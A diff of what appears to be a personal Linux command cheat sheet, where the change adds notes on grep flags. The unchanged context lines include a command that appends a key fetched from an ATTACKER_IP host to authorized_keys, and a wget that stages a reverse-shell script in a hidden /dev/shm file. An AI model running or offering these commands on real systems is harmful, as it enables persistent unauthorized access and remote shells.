@@ -174,6 +174,7 @@ curl https://ATTACKER_IP/.ssh/id_rsa.pub >> ~/.ssh/authorized_keys
 #Echo without new line and Hex
 echo -n -e
 
+
 #Count
 wc -l <file> #Lines
 wc -c #Chars
@@ -191,7 +192,14 @@ sed -i 's/OLD/NEW/g' path/file #Replace string inside a file
 echo "mido ahmed rawen 2002" | awk '{print $1}'  # mido
 echo "hate rawen : love rawen" | cut -f 2 -d ":" # love rawen
 cat file.json | jq . # output the results in JSON format
-
+-------
+grep "ahmed" -rw .  # finds all files in the current directory and subfolders that contain the exact word "ahmed" and shows the matching lines with file paths
+-r  Search recursively in all subdirectories  
+-w  Match whole words only (not part of another word)
+-i Ignore case (don’t use if you want case-sensitive)
+-x Match exact full line
+-------
+ # search 
 
 #Download in RAM
 wget 10.10.14.14:8000/tcp_pty_backconnect.py -O /dev/shm/.rev.py
